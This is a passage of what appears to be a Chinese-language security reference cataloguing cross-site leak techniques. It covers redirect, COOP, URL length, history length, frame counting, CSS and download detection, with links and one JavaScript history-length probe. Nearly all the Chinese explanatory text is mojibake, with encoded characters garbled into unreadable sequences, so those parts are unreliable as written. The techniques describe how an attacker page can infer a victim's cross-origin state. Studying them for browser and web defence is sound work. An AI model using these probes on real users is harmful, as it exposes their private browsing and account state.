è¯·æ³¨æ„ï¼Œå¦‚æœOriginæ²¡æœ‰è¢«åå°„ï¼Œè€Œæ˜¯ä½¿ç”¨é€šé…ç¬¦ï¼ˆ`Access-Control-Allow-Origin: *`ï¼‰ï¼Œè¿™ç§æ–¹æ³•å°†ä¸èµ·ä½œç”¨ã€‚

## Readable Attributes Technique

### Fetch Redirect

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Status Code
* **More info**: [https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html](https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html)
* **Summary:** åœ¨é‡å®šå‘å®Œæˆåï¼ŒGCå’ŒSAå…è®¸æ£€æŸ¥å“åº”çš„ç±»å‹ï¼ˆopaque-redirectï¼‰ã€‚
* **Code Example**: [https://xsinator.com/testing.html#Fetch%20Redirect%20Leak](https://xsinator.com/testing.html#Fetch%20Redirect%20Leak)

ä½¿ç”¨Fetch APIæäº¤è¯·æ±‚ï¼Œå¹¶ä½¿ç”¨`redirect: "manual"`å’Œå…¶ä»–å‚æ•°ï¼Œå¯ä»¥è¯»å–`response.type`å±æ€§ï¼Œå¦‚æœç­‰äº`opaqueredirect`ï¼Œåˆ™å“åº”æ˜¯ä¸€ä¸ªé‡å®šå‘ã€‚

### COOP

* **Inclusion Methods**: Pop-ups
* **Detectable Difference**: Header
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.4), [https://xsleaks.dev/docs/attacks/window-references/](https://xsleaks.dev/docs/attacks/window-references/)
* **Summary:** å—Cross-Origin Opener Policyï¼ˆCOOPï¼‰ä¿æŠ¤çš„é¡µé¢é˜»æ­¢è·¨æºäº¤äº’è®¿é—®ã€‚
* **Code Example**: [https://xsinator.com/testing.html#COOP%20Leak](https://xsinator.com/testing.html#COOP%20Leak)

æ”»å‡»è€…èƒ½å¤Ÿæ¨æ–­è·¨æºHTTPå“åº”ä¸­æ˜¯å¦å­˜åœ¨Cross-Origin Opener Policyï¼ˆCOOPï¼‰å¤´éƒ¨ã€‚Webåº”ç”¨ç¨‹åºä½¿ç”¨COOPæ¥é˜»æ­¢å¤–éƒ¨ç«™ç‚¹è·å–ä»»æ„çª—å£å¼•ç”¨ã€‚å¯ä»¥é€šè¿‡å°è¯•è®¿é—®`contentWindow`å¼•ç”¨æ¥è¯†åˆ«æ­¤å¤´éƒ¨çš„å¯è§æ€§ã€‚åœ¨æ¡ä»¶åº”ç”¨COOPçš„æƒ…å†µä¸‹ï¼Œ`opener`å±æ€§æˆä¸ºä¸€ä¸ªæ˜¾è‘—çš„æŒ‡æ ‡ï¼šå½“COOPæ¿€æ´»æ—¶ï¼Œå®ƒæ˜¯æœªå®šä¹‰çš„ï¼Œè€Œåœ¨å…¶ç¼ºå¸­æ—¶æ˜¯å®šä¹‰çš„ã€‚

### URL Max Length - Server Side

* **Inclusion Methods**: Fetch API, HTML Elements
* **Detectable Difference**: Status Code / Content
* **More info**: [https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects](https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects)
* **Summary:** ç”±äºé‡å®šå‘å“åº”é•¿åº¦å¯èƒ½è¿‡å¤§ï¼ŒæœåŠ¡å™¨å¯èƒ½ä¼šä»¥é”™è¯¯å“åº”å¹¶ç”Ÿæˆè­¦æŠ¥çš„æ–¹å¼æ£€æµ‹å“åº”å·®å¼‚ã€‚
* **Code Example**: [https://xsinator.com/testing.html#URL%20Max%20Length%20Leak](https://xsinator.com/testing.html#URL%20Max%20Length%20Leak)

å¦‚æœæœåŠ¡å™¨ç«¯é‡å®šå‘ä½¿ç”¨ç”¨æˆ·è¾“å…¥å’Œé¢å¤–æ•°æ®ï¼Œå¯ä»¥æ£€æµ‹åˆ°è¿™ç§è¡Œä¸ºï¼Œå› ä¸ºé€šå¸¸æœåŠ¡å™¨æœ‰è¯·æ±‚é•¿åº¦é™åˆ¶ã€‚å¦‚æœç”¨æˆ·æ•°æ®é•¿åº¦å‡å»1ï¼Œå› ä¸ºé‡å®šå‘ä½¿ç”¨è¯¥æ•°æ®å¹¶æ·»åŠ é¢å¤–å†…å®¹ï¼Œå°†è§¦å‘é€šè¿‡é”™è¯¯äº‹ä»¶å¯æ£€æµ‹çš„é”™è¯¯ã€‚

å¦‚æœæ‚¨å¯ä»¥å‘ç”¨æˆ·è®¾ç½®cookieï¼Œè¿˜å¯ä»¥é€šè¿‡è®¾ç½®è¶³å¤Ÿçš„cookieï¼ˆcookieç‚¸å¼¹ï¼‰æ¥æ‰§è¡Œæ­¤æ”»å‡»ï¼Œå› æ­¤é€šè¿‡å¢åŠ æ­£ç¡®å“åº”çš„å“åº”å¤§å°ï¼Œå°†è§¦å‘é”™è¯¯ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè¯·è®°ä½ï¼Œå¦‚æœæ‚¨ä»åŒä¸€ç«™ç‚¹è§¦å‘æ­¤è¯·æ±‚ï¼Œ`<script>`å°†è‡ªåŠ¨å‘é€cookieï¼ˆå› æ­¤æ‚¨å¯ä»¥æ£€æŸ¥é”™è¯¯ï¼‰ã€‚\
åœ¨åˆå§‹URLçš„å“ˆå¸Œä¸­æ·»åŠ æ‰€æœ‰è¾¾åˆ°2MBæ‰€éœ€çš„é¢å¤–ä¿¡æ¯ï¼Œä»¥ä¾¿åœ¨é‡å®šå‘ä¸­ä½¿ç”¨ã€‚

### URL Max Length - Client Side

* **Inclusion Methods**: Pop-ups
* **Detectable Difference**: Status Code / Content
* **More info**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)
* **Summary:** ç”±äºé‡å®šå‘å“åº”é•¿åº¦å¯èƒ½è¿‡å¤§ï¼Œå¯èƒ½ä¼šæ³¨æ„åˆ°è¯·æ±‚çš„å·®å¼‚ã€‚
* **Code Example**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)

æ ¹æ®[Chromiumæ–‡æ¡£](https://chromium.googlesource.com/chromium/src/+/main/docs/security/url\_display\_guidelines/url\_display\_guidelines.md#URL-Length)ï¼ŒChromeçš„æœ€å¤§URLé•¿åº¦ä¸º2MBã€‚

> ä¸€èˆ¬æ¥è¯´ï¼Œ\_webå¹³å°\_å¯¹URLé•¿åº¦æ²¡æœ‰é™åˆ¶ï¼ˆå°½ç®¡2^31æ˜¯ä¸€ä¸ªå¸¸è§é™åˆ¶ï¼‰ã€‚\_Chrome\_å‡ºäºå®é™…åŸå› å’Œé¿å…åœ¨è¿›ç¨‹é—´é€šä¿¡ä¸­å¼•èµ·æ‹’ç»æœåŠ¡é—®é¢˜çš„è€ƒè™‘ï¼Œå°†URLé™åˆ¶ä¸ºæœ€å¤§é•¿åº¦ä¸º**2MB**ã€‚

å› æ­¤ï¼Œå¦‚æœåœ¨æŸç§æƒ…å†µä¸‹é‡å®šå‘URLå“åº”è¾ƒå¤§ï¼Œå¯ä»¥ä½¿å…¶é‡å®šå‘çš„URLå¤§äº2MBä»¥è¾¾åˆ°é•¿åº¦é™åˆ¶ã€‚å½“å‘ç”Ÿè¿™ç§æƒ…å†µæ—¶ï¼ŒChromeä¼šæ˜¾ç¤ºä¸€ä¸ª`about:blank#blocked`é¡µé¢ã€‚

æ˜¾ç€çš„å·®å¼‚åœ¨äºï¼Œå¦‚æœé‡å®šå‘å·²å®Œæˆï¼Œ`window.origin`ä¼šæŠ›å‡ºé”™è¯¯ï¼Œå› ä¸ºè·¨æºæ— æ³•è®¿é—®è¯¥ä¿¡æ¯ã€‚ä½†æ˜¯ï¼Œå¦‚æœè¾¾åˆ°äº†é™åˆ¶å¹¶ä¸”åŠ è½½çš„é¡µé¢æ˜¯`about:blank#blocked`ï¼Œåˆ™çª—å£çš„`origin`ä»ç„¶æ˜¯çˆ¶çº§çš„`origin`ï¼Œè¿™æ˜¯å¯è®¿é—®çš„ä¿¡æ¯ã€‚

æ‰€æœ‰è¾¾åˆ°2MBæ‰€éœ€çš„é¢å¤–ä¿¡æ¯éƒ½å¯ä»¥é€šè¿‡åˆå§‹URLä¸­çš„å“ˆå¸Œæ·»åŠ ï¼Œä»¥ä¾¿åœ¨é‡å®šå‘ä¸­ä½¿ç”¨ã€‚

{% content-ref url="url-max-length-client-side.md" %}
[url-max-length-client-side.md](url-max-length-client-side.md)
{% endcontent-ref %}

### æœ€å¤§é‡å®šå‘æ¬¡æ•°

* **åŒ…å«æ–¹æ³•**ï¼šFetch API, Frames
* **å¯æ£€æµ‹å·®å¼‚**ï¼šçŠ¶æ€ç 
* **æ›´å¤šä¿¡æ¯**ï¼š[https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76)
* **æ‘˜è¦**ï¼šä½¿ç”¨æµè§ˆå™¨çš„é‡å®šå‘é™åˆ¶æ¥ç¡®å®š URL é‡å®šå‘çš„å‘ç”Ÿã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsinator.com/testing.html#Max%20Redirect%20Leak](https://xsinator.com/testing.html#Max%20Redirect%20Leak)

å¦‚æœæµè§ˆå™¨çš„æœ€å¤§é‡å®šå‘æ¬¡æ•°ä¸º 20ï¼Œæ”»å‡»è€…å¯ä»¥å°è¯•åŠ è½½ä»–çš„é¡µé¢è¿›è¡Œ 19 æ¬¡é‡å®šå‘ï¼Œæœ€ç»ˆå°†å—å®³è€…å‘é€åˆ°è¢«æµ‹è¯•çš„é¡µé¢ã€‚å¦‚æœè§¦å‘äº†é”™è¯¯ï¼Œåˆ™é¡µé¢è¯•å›¾é‡å®šå‘å—å®³è€…ã€‚

### å†å²è®°å½•é•¿åº¦

* **åŒ…å«æ–¹æ³•**ï¼šFrames, Pop-ups
* **å¯æ£€æµ‹å·®å¼‚**ï¼šé‡å®šå‘
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsleaks.dev/docs/attacks/navigations/](https://xsleaks.dev/docs/attacks/navigations/)
* **æ‘˜è¦**ï¼šJavaScript ä»£ç å¯ä»¥æ“çºµæµè§ˆå™¨å†å²è®°å½•ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡é•¿åº¦å±æ€§è®¿é—®ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsinator.com/testing.html#History%20Length%20Leak](https://xsinator.com/testing.html#History%20Length%20Leak)

**å†å² API** å…è®¸ JavaScript ä»£ç æ“çºµæµè§ˆå™¨å†å²è®°å½•ï¼Œè¿™ä¿å­˜äº†ç”¨æˆ·è®¿é—®çš„é¡µé¢ã€‚æ”»å‡»è€…å¯ä»¥ä½¿ç”¨é•¿åº¦å±æ€§ä½œä¸ºåŒ…å«æ–¹æ³•ï¼šæ£€æµ‹ JavaScript å’Œ HTML å¯¼èˆªã€‚\
æ£€æŸ¥ `history.length`ï¼Œè®©ç”¨æˆ·å¯¼èˆªåˆ°ä¸€ä¸ªé¡µé¢ï¼Œå°†å…¶æ”¹å›åŒæºï¼Œå¹¶æ£€æŸ¥ `history.length` çš„æ–°å€¼ã€‚

### å…·æœ‰ç›¸åŒ URL çš„å†å²è®°å½•é•¿åº¦

* **åŒ…å«æ–¹æ³•**ï¼šFrames, Pop-ups
* **å¯æ£€æµ‹å·®å¼‚**ï¼šå¦‚æœ URL ä¸çŒœæµ‹çš„ URL ç›¸åŒ
* **æ‘˜è¦**ï¼šå¯ä»¥é€šè¿‡æ»¥ç”¨å†å²è®°å½•é•¿åº¦æ¥çŒœæµ‹æ¡†æ¶/å¼¹å‡ºçª—å£çš„ä½ç½®æ˜¯å¦åœ¨ç‰¹å®š URL ä¸­ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼šå¦‚ä¸‹

æ”»å‡»è€…å¯ä»¥ä½¿ç”¨ JavaScript ä»£ç å°†æ¡†æ¶/å¼¹å‡ºçª—å£ä½ç½®æ“çºµåˆ°ä¸€ä¸ªçŒœæµ‹çš„ä½ç½®ï¼Œç„¶åç«‹å³å°†å…¶æ›´æ”¹ä¸º `about:blank`ã€‚å¦‚æœå†å²è®°å½•é•¿åº¦å¢åŠ ï¼Œè¿™æ„å‘³ç€ URL æ˜¯æ­£ç¡®çš„ï¼Œå¹¶ä¸”æœ‰æ—¶é—´å¢åŠ ï¼Œå› ä¸ºå¦‚æœ URL ç›¸åŒï¼Œåˆ™ä¸ä¼šé‡æ–°åŠ è½½ã€‚å¦‚æœé•¿åº¦æ²¡æœ‰å¢åŠ ï¼Œè¿™æ„å‘³ç€å®ƒå°è¯•åŠ è½½çŒœæµ‹çš„ URLï¼Œä½†å› ä¸ºæˆ‘ä»¬ç«‹å³åŠ è½½äº† `about:blank`ï¼Œå½“åŠ è½½çŒœæµ‹çš„ URL æ—¶ï¼Œå†å²è®°å½•é•¿åº¦ä»æœªå¢åŠ ã€‚

```javascript
async function debug(win, url) {
win.location = url + '#aaa';
win.location = 'about:blank';
await new Promise(r => setTimeout(r, 500));
return win.history.length;
}

win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=c"));

win.close();
win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=b"));
```

### å¸§è®¡æ•°

* **åŒ…å«æ–¹æ³•**: æ¡†æ¶ï¼Œå¼¹å‡ºçª—å£
* **å¯æ£€æµ‹å·®å¼‚**: é¡µé¢å†…å®¹
* **æ›´å¤šä¿¡æ¯**: [https://xsleaks.dev/docs/attacks/frame-counting/](https://xsleaks.dev/docs/attacks/frame-counting/)
* **æ‘˜è¦:** é€šè¿‡æ£€æŸ¥ `window.length` å±æ€§è¯„ä¼° iframe å…ƒç´ çš„æ•°é‡ã€‚
* **ä»£ç ç¤ºä¾‹**: [https://xsinator.com/testing.html#Frame%20Count%20Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak)

é€šè¿‡ `iframe` æˆ– `window.open` æ‰“å¼€çš„ç½‘é¡µä¸­**å¸§çš„æ•°é‡**å¯èƒ½æœ‰åŠ©äºè¯†åˆ«**ç”¨æˆ·åœ¨è¯¥é¡µé¢ä¸Šçš„çŠ¶æ€**ã€‚\
æ­¤å¤–ï¼Œå¦‚æœé¡µé¢å§‹ç»ˆå…·æœ‰ç›¸åŒæ•°é‡çš„å¸§ï¼ŒæŒç»­æ£€æŸ¥å¸§çš„æ•°é‡å¯èƒ½æœ‰åŠ©äºè¯†åˆ«å¯èƒ½æ³„éœ²ä¿¡æ¯çš„**æ¨¡å¼**ã€‚

è¿™ç§æŠ€æœ¯çš„ä¸€ä¸ªç¤ºä¾‹æ˜¯åœ¨ Chrome ä¸­ï¼Œå¯ä»¥é€šè¿‡**å¸§è®¡æ•°**æ£€æµ‹åˆ° **PDF**ï¼Œå› ä¸ºå†…éƒ¨ä½¿ç”¨äº† `embed`ã€‚å­˜åœ¨[æ‰“å¼€ URL å‚æ•°](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113)ï¼Œå…è®¸å¯¹å†…å®¹è¿›è¡Œä¸€äº›æ§åˆ¶ï¼Œå¦‚ `zoom`ã€`view`ã€`page`ã€`toolbar`ï¼Œå…¶ä¸­è¿™ç§æŠ€æœ¯å¯èƒ½å¾ˆæœ‰è¶£ã€‚

### HTMLElements

* **åŒ…å«æ–¹æ³•**: HTML å…ƒç´ 
* **å¯æ£€æµ‹å·®å¼‚**: é¡µé¢å†…å®¹
* **æ›´å¤šä¿¡æ¯**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/)
* **æ‘˜è¦:** è¯»å–æ³„éœ²çš„å€¼ä»¥åŒºåˆ†ä¸¤ç§å¯èƒ½çš„çŠ¶æ€
* **ä»£ç ç¤ºä¾‹**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/), [https://xsinator.com/testing.html#Media%20Dimensions%20Leak](https://xsinator.com/testing.html#Media%20Dimensions%20Leak), [https://xsinator.com/testing.html#Media%20Duration%20Leak](https://xsinator.com/testing.html#Media%20Duration%20Leak)

é€šè¿‡ HTML å…ƒç´ æ³„éœ²ä¿¡æ¯åœ¨ Web å®‰å…¨ä¸­æ˜¯ä¸€ä¸ªé—®é¢˜ï¼Œç‰¹åˆ«æ˜¯å½“åŸºäºç”¨æˆ·ä¿¡æ¯ç”ŸæˆåŠ¨æ€åª’ä½“æ–‡ä»¶ï¼Œæˆ–è€…æ·»åŠ æ°´å°æ”¹å˜åª’ä½“å¤§å°æ—¶ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œé€šè¿‡åˆ†ææŸäº› HTML å…ƒç´ æš´éœ²çš„ä¿¡æ¯æ¥åŒºåˆ†å¯èƒ½çš„çŠ¶æ€ã€‚

### HTML å…ƒç´ æ³„éœ²çš„ä¿¡æ¯

* **HTMLMediaElement**: æ­¤å…ƒç´ æ˜¾ç¤ºåª’ä½“çš„ `duration` å’Œ `buffered` æ—¶é—´ï¼Œå¯ä»¥é€šè¿‡å…¶ API è®¿é—®ã€‚[äº†è§£æ›´å¤šå…³äº HTMLMediaElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement)
* **HTMLVideoElement**: å®ƒå…¬å¼€ `videoHeight` å’Œ `videoWidth`ã€‚åœ¨æŸäº›æµè§ˆå™¨ä¸­ï¼Œè¿˜æä¾›äº†é¢å¤–çš„å±æ€§ï¼Œå¦‚ `webkitVideoDecodedByteCount`ã€`webkitAudioDecodedByteCount` å’Œ `webkitDecodedFrameCount`ï¼Œæä¾›äº†æœ‰å…³åª’ä½“å†…å®¹çš„æ›´æ·±å…¥ä¿¡æ¯ã€‚[äº†è§£æ›´å¤šå…³äº HTMLVideoElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement)
* **getVideoPlaybackQuality()**: æ­¤å‡½æ•°æä¾›æœ‰å…³è§†é¢‘æ’­æ”¾è´¨é‡çš„è¯¦ç»†ä¿¡æ¯ï¼ŒåŒ…æ‹¬ `totalVideoFrames`ï¼Œå¯ä»¥æŒ‡ç¤ºå¤„ç†çš„è§†é¢‘æ•°æ®é‡ã€‚[äº†è§£æ›´å¤šå…³äº getVideoPlaybackQuality()](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality)
* **HTMLImageElement**: æ­¤å…ƒç´ æ³„éœ²å›¾åƒçš„ `height` å’Œ `width`ã€‚ä½†æ˜¯ï¼Œå¦‚æœå›¾åƒæ— æ•ˆï¼Œè¿™äº›å±æ€§å°†è¿”å› 0ï¼Œå¹¶ä¸” `image.decode()` å‡½æ•°å°†è¢«æ‹’ç»ï¼Œè¡¨ç¤ºæœªèƒ½æ­£ç¡®åŠ è½½å›¾åƒã€‚[äº†è§£æ›´å¤šå…³äº HTMLImageElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement)

### CSS å±æ€§

* **åŒ…å«æ–¹æ³•**: HTML å…ƒç´ 
* **å¯æ£€æµ‹å·®å¼‚**: é¡µé¢å†…å®¹
* **æ›´å¤šä¿¡æ¯**: [https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle](https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle), [https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html](https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html)
* **æ‘˜è¦:** è¯†åˆ«ä¸ç”¨æˆ·çŠ¶æ€æˆ–çŠ¶æ€ç›¸å…³çš„ç½‘ç«™æ ·å¼å˜åŒ–ã€‚
* **ä»£ç ç¤ºä¾‹**: [https://xsinator.com/testing.html#CSS%20Property%20Leak](https://xsinator.com/testing.html#CSS%20Property%20Leak)

Web åº”ç”¨ç¨‹åºå¯èƒ½æ ¹æ®ç”¨æˆ·çŠ¶æ€æ›´æ”¹**ç½‘ç«™æ ·å¼**ã€‚è·¨åŸŸ CSS æ–‡ä»¶å¯ä»¥é€šè¿‡**HTML é“¾æ¥å…ƒç´ **åµŒå…¥åˆ°æ”»å‡»è€…é¡µé¢ä¸­ï¼Œå¹¶ä¸”è¿™äº›**è§„åˆ™**å°†åº”ç”¨äºæ”»å‡»è€…é¡µé¢ã€‚å¦‚æœé¡µé¢åŠ¨æ€æ›´æ”¹è¿™äº›è§„åˆ™ï¼Œæ”»å‡»è€…å¯ä»¥æ ¹æ®ç”¨æˆ·çŠ¶æ€**æ£€æµ‹**è¿™äº›**å·®å¼‚**ã€‚\
ä½œä¸ºä¸€ç§æ³„æ¼æŠ€æœ¯ï¼Œæ”»å‡»è€…å¯ä»¥ä½¿ç”¨ `window.getComputedStyle` æ–¹æ³•æ¥**è¯»å–**ç‰¹å®š HTML å…ƒç´ çš„ CSS å±æ€§ã€‚å› æ­¤ï¼Œå¦‚æœå·²çŸ¥å—å½±å“çš„å…ƒç´ å’Œå±æ€§åç§°ï¼Œæ”»å‡»è€…å¯ä»¥è¯»å–ä»»æ„ CSS å±æ€§ã€‚

### CSS å†å²

* **åŒ…å«æ–¹æ³•**: HTML å…ƒç´ 
* **å¯æ£€æµ‹å·®å¼‚**: é¡µé¢å†…å®¹
* **æ›´å¤šä¿¡æ¯**: [https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history](https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history)
* **æ‘˜è¦:** æ£€æµ‹æ˜¯å¦åº”ç”¨äº† `:visited` æ ·å¼äº URLï¼ŒæŒ‡ç¤ºå…¶å·²è¢«è®¿é—®è¿‡
* **ä»£ç ç¤ºä¾‹**: [http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html)

{% hint style="info" %}
æ ¹æ®[**æ­¤**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/)ï¼Œåœ¨æ— å¤´ Chrome ä¸­æ— æ•ˆã€‚
{% endhint %}

CSS `:visited` é€‰æ‹©å™¨ç”¨äºåœ¨ç”¨æˆ·å…ˆå‰è®¿é—®è¿‡çš„æƒ…å†µä¸‹ä»¥ä¸åŒæ ·å¼æ˜¾ç¤º URLã€‚è¿‡å»ï¼Œ`getComputedStyle()` æ–¹æ³•å¯ç”¨äºè¯†åˆ«è¿™äº›æ ·å¼å·®å¼‚ã€‚ç„¶è€Œï¼Œç°ä»£æµè§ˆå™¨å·²ç»å®æ–½äº†å®‰å…¨æªæ–½ï¼Œé˜²æ­¢æ­¤æ–¹æ³•æ­ç¤ºé“¾æ¥çŠ¶æ€ã€‚è¿™äº›æªæ–½åŒ…æ‹¬å§‹ç»ˆè¿”å›è®¡ç®—æ ·å¼ï¼Œå°±åƒé“¾æ¥å·²è¢«è®¿é—®ä¸€æ ·ï¼Œå¹¶é™åˆ¶å¯ä»¥ä½¿ç”¨ `:visited` é€‰æ‹©å™¨åº”ç”¨çš„æ ·å¼ã€‚

å°½ç®¡å­˜åœ¨è¿™äº›é™åˆ¶ï¼Œä»ç„¶å¯ä»¥é—´æ¥åœ°è¾¨åˆ«é“¾æ¥çš„è®¿é—®çŠ¶æ€ã€‚ä¸€ç§æŠ€æœ¯æ¶‰åŠæ¬ºéª—ç”¨æˆ·ä¸å— CSS å½±å“çš„åŒºåŸŸè¿›è¡Œäº¤äº’ï¼Œç‰¹åˆ«æ˜¯åˆ©ç”¨ `mix-blend-mode` å±æ€§ã€‚æ­¤å±æ€§å…è®¸å…ƒç´ ä¸å…¶èƒŒæ™¯æ··åˆï¼Œæ ¹æ®ç”¨æˆ·äº¤äº’å¯èƒ½æ˜¾ç¤ºå·²è®¿é—®çŠ¶æ€ã€‚

æ­¤å¤–ï¼Œå¯ä»¥é€šè¿‡åˆ©ç”¨é“¾æ¥çš„æ¸²æŸ“æ—¶é—´æ¥å®ç°æ— éœ€ç”¨æˆ·äº¤äº’çš„æ£€æµ‹ã€‚ç”±äºæµè§ˆå™¨å¯èƒ½ä»¥ä¸åŒæ–¹å¼å‘ˆç°å·²è®¿é—®å’Œæœªè®¿é—®çš„é“¾æ¥ï¼Œè¿™å¯èƒ½å¯¼è‡´æ¸²æŸ“æ—¶å‡ºç°å¯æµ‹é‡çš„æ—¶é—´å·®å¼‚ã€‚åœ¨ Chromium ç¼ºé™·æŠ¥å‘Šä¸­æåˆ°äº†ä¸€ä¸ªæ¦‚å¿µéªŒè¯ï¼ˆPoCï¼‰ï¼Œæ¼”ç¤ºäº†ä½¿ç”¨å¤šä¸ªé“¾æ¥æ”¾å¤§æ—¶é—´å·®å¼‚çš„æŠ€æœ¯ï¼Œä»è€Œé€šè¿‡æ—¶é—´åˆ†æä½¿å·²è®¿é—®çŠ¶æ€å¯æ£€æµ‹ã€‚

æœ‰å…³è¿™äº›å±æ€§å’Œæ–¹æ³•çš„æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼Œè¯·è®¿é—®å®ƒä»¬çš„æ–‡æ¡£é¡µé¢ï¼š

* `:visited`: [MDN æ–‡æ¡£](https://developer.mozilla.org/en-US/docs/Web/CSS/:visited)
* `getComputedStyle()`: [MDN æ–‡æ¡£](https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle)
* `mix-blend-mode`: [MDN æ–‡æ¡£](https://developer.mozilla.org/en-US/docs/Web/CSS/mix-blend-mode)

### ContentDocument X-Frame Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: Headers
* **More info**: [https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf](https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf)
* **Summary:** åœ¨Google Chromeä¸­ï¼Œå½“ç”±äºX-Frame-Optionsé™åˆ¶è€Œé˜»æ­¢é¡µé¢åµŒå…¥åˆ°è·¨æºç«™ç‚¹æ—¶ï¼Œä¼šæ˜¾ç¤ºä¸“ç”¨é”™è¯¯é¡µé¢ã€‚
* **Code Example**: [https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak](https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak)

åœ¨Chromeä¸­ï¼Œå¦‚æœå°†`X-Frame-Options`å¤´è®¾ç½®ä¸º"deny"æˆ–"same-origin"çš„é¡µé¢ä½œä¸ºå¯¹è±¡åµŒå…¥ï¼Œå°†å‡ºç°é”™è¯¯é¡µé¢ã€‚ä¸åœ¨iframesæˆ–å…¶ä»–æµè§ˆå™¨ä¸­ä¸åŒï¼ŒChromeä¸ºæ­¤å¯¹è±¡çš„`contentDocument`å±æ€§è¿”å›ä¸€ä¸ªç©ºæ–‡æ¡£å¯¹è±¡ï¼ˆè€Œä¸æ˜¯`null`ï¼‰ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹æ£€æµ‹ç©ºæ–‡æ¡£ï¼Œå¯èƒ½æ­ç¤ºæœ‰å…³ç”¨æˆ·çŠ¶æ€çš„ä¿¡æ¯ï¼Œå°¤å…¶æ˜¯å¦‚æœå¼€å‘äººå‘˜ä¸ä¸€è‡´åœ°è®¾ç½®X-Frame-Optionså¤´ï¼Œç»å¸¸å¿½è§†é”™è¯¯é¡µé¢ã€‚æ„è¯†åˆ°å¹¶ä¸€è‡´åº”ç”¨å®‰å…¨å¤´éƒ¨å¯¹äºé˜²æ­¢æ­¤ç±»æ³„æ¼è‡³å…³é‡è¦ã€‚

### Download Detection

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: Headers
* **More info**: [https://xsleaks.dev/docs/attacks/navigations/#download-trigger](https://xsleaks.dev/docs/attacks/navigations/#download-trigger)
* **Summary:** æ”»å‡»è€…å¯ä»¥åˆ©ç”¨iframesæ¥è¯†åˆ«æ–‡ä»¶ä¸‹è½½ï¼›iframeçš„æŒç»­å¯è®¿é—®æ€§æ„å‘³ç€æ–‡ä»¶ä¸‹è½½æˆåŠŸã€‚
* **Code Example**: [https://xsleaks.dev/docs/attacks/navigations/#download-bar](https://xsleaks.dev/docs/attacks/navigations/#download-bar)

ç‰¹åˆ«æ˜¯`Content-Disposition: attachment`å¤´æŒ‡ç¤ºæµè§ˆå™¨ä¸‹è½½å†…å®¹è€Œä¸æ˜¯å†…è”æ˜¾ç¤ºã€‚è¿™ç§è¡Œä¸ºå¯ä»¥è¢«åˆ©ç”¨æ¥æ£€æµ‹ç”¨æˆ·æ˜¯å¦å¯ä»¥è®¿é—®è§¦å‘æ–‡ä»¶ä¸‹è½½çš„é¡µé¢ã€‚åœ¨åŸºäºChromiumçš„æµè§ˆå™¨ä¸­ï¼Œæœ‰ä¸€äº›æŠ€æœ¯å¯ä»¥æ£€æµ‹è¿™ç§ä¸‹è½½è¡Œä¸ºï¼š

1. **ä¸‹è½½æ ç›‘æ§**ï¼š

* å½“åœ¨åŸºäºChromiumçš„æµè§ˆå™¨ä¸­ä¸‹è½½æ–‡ä»¶æ—¶ï¼Œä¸‹è½½æ ä¼šå‡ºç°åœ¨æµè§ˆå™¨çª—å£åº•éƒ¨ã€‚
